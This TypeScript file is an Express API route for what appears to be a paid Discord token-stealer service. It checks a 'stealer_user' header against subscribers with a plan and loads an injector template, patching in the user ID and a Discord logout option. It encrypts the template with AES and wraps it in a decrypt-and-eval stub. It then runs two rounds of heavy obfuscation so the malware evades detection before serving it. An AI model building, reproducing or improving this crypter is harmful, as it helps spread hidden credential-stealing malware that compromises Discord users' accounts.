import js_obf from 'javascript-obfuscator';
import { obfuscate } from 'js-confuser';
import { Request, Response } from 'express';
import { readFileSync, writeFileSync } from 'fs';
import { PrismaClient } from '@prisma/client'
import crypto from 'crypto';
import { randomBytes, pbkdf2Sync, createCipheriv, createHash } from 'crypto';
import { join } from 'path';

const prisma = new PrismaClient();

export default {
    name: `/api/injector`, method: 'get',

    async execute(req: Request, res: Response) {
        if(!req?.headers?.stealer_user) return res.status(401);
        const user = await prisma.users.findFirst({
          where: {
              id: req?.headers?.stealer_user as string
          }
      });
  
      if(!user?.plan) return res.status(401);

      const Casey_injector = readFileSync(join(__dirname, 'code.js'), 'utf-8').replace('USER_ID_HERE', req?.headers?.stealer_user as string)
      .replace('DISCORD_LOGOUT_HERE', req?.headers?.logout_discord as string);
      const secret = randomBytes(64).toString('base64');
      const encryptionKey = createHash('sha256').update(String(secret)).digest('base64').substr(0, 32);

      let injector_code = `${Casey_injector}`;
      const { encryptedData, salt, iv } = encrypt(injector_code, encryptionKey);

      injector_code = `const crypto = require('crypto');
function decrypt(encdata, masterkey, salt, iv) {
  const key = crypto.pbkdf2Sync(masterkey, Buffer.from(salt, 'base64'), 100000, 32, 'sha512');
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, Buffer.from(iv, 'base64'));
  let decrypted = decipher.update(encdata, 'base64', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
};
      
const decrypted = decrypt("${encryptedData}", "${encryptionKey}", "${salt}", "${iv}");
new Function('require', decrypted)(require);`;


const first_obfuscation = await obfuscate(injector_code,  {
    calculator: true,
    compact: true,
    controlFlowFlattening: 0.42,
    deadCode: 0.045,
    dispatcher: 0.50,
    duplicateLiteralsRemoval: 0.5,
    globalConcealing: true,
    hexadecimalNumbers: true,
    identifierGenerator: 'randomized',
    minify: true,
    movedDeclarations: true,
    objectExtraction: true,
    opaquePredicates: 0.5,
    preset: 'high',
    renameGlobals: true,
    renameVariables: true,
    shuffle: true,
    stack: 0.3,
    stringConcealing: true,
    stringSplitting: 0.23,
    target: 'node'
});

const second_obfuscation = js_obf.obfuscate(first_obfuscation,  {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 1,
    numbersToExpressions: true,
    simplify: true,
    shuffleStringArray: true,
    splitStrings: true,
    stringArrayThreshold: 1,
 }).getObfuscatedCode();

 res.status(200).send(second_obfuscation);
  },
};

function encrypt(text: string, masterkey: string) {
    const iv = randomBytes(16);
    const salt = randomBytes(16);
    const key = pbkdf2Sync(masterkey, salt, 100000, 32, 'sha512');
    const cipher = createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(text, 'utf8', 'base64');
    encrypted += cipher.final('base64');

    return {
      encryptedData: encrypted,
      salt: salt.toString('base64'),
      iv: iv.toString('base64')
    };
};


function decrypt(encdata: string, masterkey: string, salt: string, iv: string) {
    const key = crypto.pbkdf2Sync(masterkey, Buffer.from(salt, 'base64'), 100000, 32, 'sha512');
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, Buffer.from(iv, 'base64'));
    let decrypted = decipher.update(encdata, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
};